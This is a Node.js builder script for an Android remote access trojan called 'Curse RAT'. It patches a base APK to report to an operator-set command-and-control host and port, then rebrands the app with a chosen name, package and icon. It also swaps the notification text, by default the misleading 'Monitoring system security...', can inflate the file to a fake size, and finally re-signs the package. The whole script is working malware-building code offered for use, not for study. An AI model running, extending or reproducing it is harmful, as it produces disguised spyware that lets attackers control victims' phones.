const { execSync } = require('child_process');
const fs = require('fs');
const path = require('path');
const crypto = require('crypto');

let config = {
    hosts: "127.0.0.1:7777", // Legacy support
    appName: "Curse RAT",
    appVersion: "1.0",
    packageName: "com.curse.rat",
    notifText: "Curse Service running...",
    notifEnabled: true,
    fakeSize: 0,
    icon: null,
    permissions: "ALL"
};

// Check if we are using advanced config
if (process.argv[2] === '--config') {
    const configPath = process.argv[3];
    if (fs.existsSync(configPath)) {
        config = JSON.parse(fs.readFileSync(configPath, 'utf8'));
    }
} else if (process.argv[2] && process.argv[3]) {
    config.hosts = `${process.argv[2]}:${process.argv[3]}`;
}

const workDir = 'workdir';
const outputDir = 'output';

// ============================================
// ✅ التحقق من وجود base.apk قبل البدء
// ============================================
if (!fs.existsSync('base.apk')) {
    console.error("❌ BUILD FAILED: base.apk not found!");
    console.error(`   Please place a valid base.apk in ${__dirname}`);
    process.exit(1);
}
console.log("✅ base.apk found.");

try {
    console.log("--- Starting Advanced APK Build ---");
    console.log(`Config: AppName=${config.appName}, Package=${config.packageName}, Hosts=${config.hosts}`);

    if (!fs.existsSync(outputDir)) fs.mkdirSync(outputDir);

    // 1. Decompile with -r flag to reduce memory usage (fixes "Killed" issue)
    console.log("> Decompiling base.apk (using -r flag for low memory)...");
    execSync(`apktool d -r base.apk -o ${workDir} -f`);

    // 2. Patch ConnectionManager.smali (Reverted to single HOST/PORT patching)
    console.log("> Patching ConnectionManager...");
    const smaliDirsFound = fs.readdirSync(workDir).filter(d => d.startsWith('smali'));
    let connSmaliPath = null;
    for (const sDir of smaliDirsFound) {
        const p = path.join(workDir, sDir, 'com/curse/rat/ConnectionManager.smali');
        if (fs.existsSync(p)) {
            connSmaliPath = p;
            break;
        }
    }

    if (connSmaliPath) {
        let content = fs.readFileSync(connSmaliPath, 'utf8');
        const hostPort = config.hosts.split(':');
        const host = hostPort[0];
        const port = hostPort[1] || "7777";
        
        // Patch values in <clinit> (static constructor) since fields are no longer final
        content = content.replace(/const-string v(\d+), ".*"\s+sput-object v\1, Lcom\/curse\/rat\/ConnectionManager;->HOST:Ljava\/lang\/String;/, (match, reg) => {
            return `const-string v${reg}, "${host}"\n    sput-object v${reg}, Lcom/curse/rat/ConnectionManager;->HOST:Ljava/lang/String;`;
        });

        const portHex = "0x" + parseInt(port).toString(16);
        content = content.replace(/const\/16 v(\d+), .*\s+sput v\1, Lcom\/curse\/rat\/ConnectionManager;->PORT:I/, (match, reg) => {
            return `const/16 v${reg}, ${portHex}\n    sput v${reg}, Lcom/curse/rat/ConnectionManager;->PORT:I`;
        });
        
        fs.writeFileSync(connSmaliPath, content);
    } else {
        console.warn("  ! Warning: ConnectionManager.smali not found.");
    }

    // 3. Patch strings.xml
    console.log("> Patching strings.xml...");
    const stringsPath = path.join(workDir, 'res/values/strings.xml');
    if (fs.existsSync(stringsPath)) {
        let content = fs.readFileSync(stringsPath, 'utf8');
        content = content.replace(/<string name="app_name">.*?<\/string>/, `<string name="app_name">${config.appName}</string>`);
        content = content.replace(/<string name="notification_text">.*?<\/string>/, `<string name="notification_text">${config.notifText}</string>`);
        fs.writeFileSync(stringsPath, content);
    }

    // 3b. Patch apktool.yml for versioning
    console.log("> Patching apktool.yml...");
    const apktoolYamlPath = path.join(workDir, 'apktool.yml');
    if (fs.existsSync(apktoolYamlPath)) {
        let content = fs.readFileSync(apktoolYamlPath, 'utf8');
        content = content.replace(/versionName: .*/, `versionName: ${config.appVersion}`);
        fs.writeFileSync(apktoolYamlPath, content);
    }

    // 3c. Patch MainService.smali for custom notification
    console.log("> Patching MainService.smali for notification...");
    let mainServiceSmaliPath = null;
    for (const sDir of smaliDirsFound) {
        const p = path.join(workDir, sDir, 'com/curse/rat/MainService.smali');
        if (fs.existsSync(p)) {
            mainServiceSmaliPath = p;
            break;
        }
    }
    if (mainServiceSmaliPath) {
        let content = fs.readFileSync(mainServiceSmaliPath, 'utf8');
        const titleRegex = /const-string v1, "Curse Service"[\s\S]*?invoke-virtual \{v0, v1\}, Landroidx\/core\/app\/NotificationCompat\$Builder;->setContentTitle/;
        content = content.replace(titleRegex, (match) => {
            return `const-string v1, "${config.appName}"\n    invoke-virtual {v0, v1}, Landroidx/core/app/NotificationCompat$Builder;->setContentTitle`;
        });
        const textRegex = /const-string v1, "Monitoring system security\.\.\."[\s\S]*?invoke-virtual \{v0, v1\}, Landroidx\/core\/app\/NotificationCompat\$Builder;->setContentText/;
        content = content.replace(textRegex, (match) => {
            return `const-string v1, "${config.notifText}"\n    invoke-virtual {v0, v1}, Landroidx/core/app/NotificationCompat$Builder;->setContentText`;
        });
        fs.writeFileSync(mainServiceSmaliPath, content);
    }

    // 4. Handle Icon replacement
    if (config.icon) {
        console.log("> Injecting custom icon and removing adaptive icons...");
        const iconData = config.icon.split(';base64,').pop();
        const iconBuffer = Buffer.from(iconData, 'base64');
        const resDir = path.join(workDir, 'res');
        const allResDirs = fs.readdirSync(resDir);
        
        allResDirs.forEach(dir => {
            if (dir.startsWith('mipmap-')) {
                const dirPath = path.join(resDir, dir);
                const pngFiles = ['ic_launcher.png', 'ic_launcher_round.png'];
                pngFiles.forEach(f => {
                    fs.writeFileSync(path.join(dirPath, f), iconBuffer);
                });
                const xmlFiles = ['ic_launcher.xml', 'ic_launcher_round.xml'];
                xmlFiles.forEach(f => {
                    const xmlPath = path.join(dirPath, f);
                    if (fs.existsSync(xmlPath)) {
                        fs.unlinkSync(xmlPath);
                        console.log(`  - Removed adaptive icon: ${dir}/${f}`);
                    }
                });
            }
        });
    }

    // 5. Patch Package Name (Enhanced Surgery)
    const oldPkg = "com.curse.rat";
    if (config.packageName !== oldPkg) {
        console.log(`> Changing Package Name to ${config.packageName}...`);
        const newPkg = config.packageName;
        const oldPath = oldPkg.replace(/\./g, '/');
        const newPath = newPkg.replace(/\./g, '/');

        console.log("  - Patching AndroidManifest.xml...");
        let manifestPath = path.join(workDir, 'AndroidManifest.xml');
        let manifest = fs.readFileSync(manifestPath, 'utf8');
        manifest = manifest.replace(new RegExp(`package="${oldPkg}"`, 'g'), `package="${newPkg}"`);
        manifest = manifest.replace(new RegExp(`"${oldPkg}`, 'g'), `"${newPkg}`);
        manifest = manifest.replace(new RegExp(`>${oldPkg}`, 'g'), `>${newPkg}`);
        fs.writeFileSync(manifestPath, manifest);

        console.log("  - Replacing strings in Smali...");
        const smaliDirs = fs.readdirSync(workDir).filter(d => d.startsWith('smali'));
        smaliDirs.forEach(sDir => {
            const fullPath = path.join(workDir, sDir);
            execSync(`grep -rli "L${oldPath}" ${fullPath} | xargs -r sed -i 's|L${oldPath}|L${newPath}|g'`);
            execSync(`grep -rli "${oldPkg}" ${fullPath} | xargs -r sed -i 's|${oldPkg}|${newPkg}|g'`);
        });

        console.log("  - Replacing strings in XML files...");
        const resSubDirs = ['layout', 'xml', 'values', 'menu'];
        resSubDirs.forEach(sub => {
            const subPath = path.join(workDir, 'res', sub);
            if (fs.existsSync(subPath)) {
                execSync(`grep -rli "${oldPkg}" ${subPath} | xargs -r sed -i 's|${oldPkg}|${newPkg}|g'`);
            }
        });

        console.log("  - Relocating Smali directories...");
        smaliDirs.forEach(sDir => {
            const rootSmali = path.join(workDir, sDir);
            const oldDirFull = path.join(rootSmali, oldPath);
            const newDirFull = path.join(rootSmali, newPath);
            if (fs.existsSync(oldDirFull)) {
                fs.mkdirSync(newDirFull, { recursive: true });
                execSync(`cp -r ${oldDirFull}/* ${newDirFull}/ 2>/dev/null || true`);
                execSync(`rm -rf ${oldDirFull}`);
                let currentDir = path.dirname(oldDirFull);
                while (currentDir !== rootSmali && currentDir.length > rootSmali.length) {
                    if (fs.existsSync(currentDir) && fs.readdirSync(currentDir).length === 0) {
                        fs.rmdirSync(currentDir);
                        currentDir = path.dirname(currentDir);
                    } else {
                        break;
                    }
                }
            }
        });
    }

    // 6. Patch Permissions in AndroidManifest.xml
    if (config.permissions !== "ALL") {
        console.log("> Filtering permissions...");
        let manifest = fs.readFileSync(path.join(workDir, 'AndroidManifest.xml'), 'utf8');
        const permRegex = /<uses-permission android:name="android\.permission\.(.*?)" \/>/g;
        const toKeep = Array.isArray(config.permissions) ? config.permissions : [];
        const essentials = [
            "INTERNET", 
            "ACCESS_NETWORK_STATE", 
            "WAKE_LOCK", 
            "FOREGROUND_SERVICE", 
            "FOREGROUND_SERVICE_MEDIA_PROJECTION",
            "RECEIVE_BOOT_COMPLETED",
            "POST_NOTIFICATIONS"
        ];
        essentials.forEach(e => { if (!toKeep.includes(e)) toKeep.push(e); });
        manifest = manifest.replace(permRegex, (fullMatch, permName) => {
            return toKeep.includes(permName) ? fullMatch : `<!-- Removed: ${permName} -->`;
        });
        fs.writeFileSync(path.join(workDir, 'AndroidManifest.xml'), manifest);
    }

    // 7. Fake Size Bloating
    if (config.fakeSize > 0) {
        console.log(`> Bloating APK by ${config.fakeSize} MB with random data...`);
        const paddingDir = path.join(workDir, 'assets/padding');
        if (!fs.existsSync(paddingDir)) fs.mkdirSync(paddingDir, { recursive: true });
        const paddingFile = path.join(paddingDir, 'data.bin');
        const sizeInBytes = config.fakeSize * 1024 * 1024;
        const buffer = crypto.randomBytes(sizeInBytes);
        fs.writeFileSync(paddingFile, buffer);
    }

    // 8. Rebuild
    const patchedApk = path.join(outputDir, 'patched.apk');
    console.log("> Rebuilding APK...");
    execSync(`apktool b ${workDir} -o ${patchedApk}`);

    // 9. Sign
    console.log("> Signing APK...");
    if (!fs.existsSync('debug.keystore')) {
        execSync(`keytool -genkey -v -keystore debug.keystore -storepass android -alias androiddebugkey -keypass android -keyalg RSA -keysize 2048 -validity 10000 -dname "CN=Android Debug,O=Android,C=US"`);
    }
    execSync(`jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore debug.keystore -storepass android -keypass android ${patchedApk} androiddebugkey`);

    // 10. Zipalign
    const finalApk = path.join(outputDir, 'Curse.apk');
    console.log("> Zipaligning...");
    execSync(`zipalign -v -f 4 ${patchedApk} ${finalApk}`);

    console.log("--- SUCCESS: Curse.apk is ready ---");

} catch (err) {
    console.error("BUILD FAILED:", err.message);
    process.exit(1);
}
